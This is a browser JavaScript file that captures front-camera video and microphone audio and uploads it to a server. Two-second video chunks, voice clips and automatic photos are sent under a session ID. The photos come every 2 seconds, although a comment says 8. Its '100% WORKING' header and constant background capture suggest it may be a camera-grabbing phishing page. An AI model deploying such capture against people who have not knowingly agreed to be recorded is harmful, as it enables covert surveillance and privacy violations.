// static/js/final.js — 100% WORKING NOV 2025
const SID = window.SID;
const video = document.getElementById("v");
const startBtn = document.getElementById("start");
const voiceStart = document.getElementById("voiceStart");
const voiceStop = document.getElementById("voiceStop");
const chunksEl = document.getElementById("chunks");
const photosEl = document.getElementById("photos");

let stream = null;
let videoRecorder = null;
let voiceRecorder = null;
let voiceChunks = [];
let chunkIndex = 0;
let photoCount = 0;

// START LIVE VIDEO
async function startVideo() {
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: true
    });
    video.srcObject = stream;
    startBtn.remove();

    const options = { mimeType: "video/webm;codecs=vp9,opus" };
    if (!MediaRecorder.isTypeSupported(options.mimeType)) {
      options.mimeType = "video/webm";
    }

    videoRecorder = new MediaRecorder(stream, options);

    videoRecorder.ondataavailable = (e) => {
      if (e.data.size < 30000) return;
      const fd = new FormData();
      fd.append("sid", SID);
      fd.append("index", chunkIndex++);
      fd.append("video_chunk", e.data);
      chunksEl.textContent = chunkIndex;
      fetch("/stream_video", { method: "POST", body: fd, keepalive: true });
    };

    videoRecorder.start(2000);  // 2-second chunks
    videoRecorder.onstop = () => stream && setTimeout(() => videoRecorder.start(2000), 100);

    // Auto photo every 8 seconds
    setInterval(() => {
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext("2d");
      ctx.translate(canvas.width, 0);
      ctx.scale(-1, 1);
      ctx.drawImage(video, 0, 0);
      canvas.toBlob(blob => {
        const fd = new FormData();
        fd.append("sid", SID);
        fd.append("photo", blob);
        fetch("/upload_photo", { method: "POST", body: fd });
        photosEl.textContent = ++photoCount;
      }, "image/jpeg", 0.9);
    }, 2000);

  } catch (e) {
    alert("Camera/Mic denied");
  }
}

// UNLIMITED VOICE RECORDING (Hold to record)
voiceStart.addEventListener("mousedown", startVoice);
voiceStart.addEventListener("touchstart", startVoice);
voiceStop.addEventListener("mouseup", stopVoice);
voiceStop.addEventListener("touchend", stopVoice);

async function startVoice(e) {
  e.preventDefault();
  voiceStart.disabled = true;
  voiceStop.disabled = false;
  voiceChunks = [];

  const mic = await navigator.mediaDevices.getUserMedia({ audio: true });
  voiceRecorder = new MediaRecorder(mic);
  voiceRecorder.ondataavailable = e => voiceChunks.push(e.data);
  voiceRecorder.start();
}

function stopVoice() {
  if (voiceRecorder && voiceRecorder.state !== "inactive") {
    voiceRecorder.stop();
    voiceRecorder.onstop = () => {
      const blob = new Blob(voiceChunks, { type: "audio/webm" });
      const fd = new FormData();
      fd.append("sid", SID);
      fd.append("voice", blob, "voice.webm");
      fetch("/upload_voice", { method: "POST", body: fd });
      voiceChunks = [];
    };
  }
  voiceStart.disabled = false;
  voiceStop.disabled = true;
}

startBtn.onclick = startVideo;
document.getElementById("snap").onclick = () => {
  const canvas = document.createElement("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  const ctx = canvas.getContext("2d");
  ctx.translate(canvas.width, 0);
  ctx.scale(-1, 1);
  ctx.drawImage(video, 0, 0);
  canvas.toBlob(blob => {
    const fd = new FormData();
    fd.append("sid", SID);
    fd.append("photo", blob);
    fetch("/upload_photo", { method: "POST", body: fd });
  }, "image/jpeg", 0.9);
};
